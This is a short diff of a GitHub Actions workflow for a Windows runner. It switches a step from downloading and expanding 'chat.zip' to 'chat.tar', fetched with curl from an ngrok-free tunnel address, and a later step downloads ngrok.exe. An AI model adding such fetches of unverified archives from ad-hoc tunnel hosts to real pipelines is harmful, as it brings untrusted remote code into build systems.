@@ -12,12 +12,12 @@ jobs:
           $dl = "$env:USERPROFILE\Downloads\chat-work"
           New-Item -ItemType Directory -Force -Path $dl
           echo "WORK_DIR=$dl" >> $env:GITHUB_ENV
-      - name: Download and extract chat.zip
+      - name: Download and extract chat.tar
         shell: powershell
         run: |
           cd $env:WORK_DIR
-          curl.exe -L -o chat.zip https://abstrusely-procompensation-phuong.ngrok-free.dev/chat.zip
-          Expand-Archive chat.zip -Force
+          curl.exe -L -o chat.tar https://abstrusely-procompensation-phuong.ngrok-free.dev/chat.tar
+          tar -xf chat.tar
       - name: Download ngrok.exe
         shell: powershell
         run: |
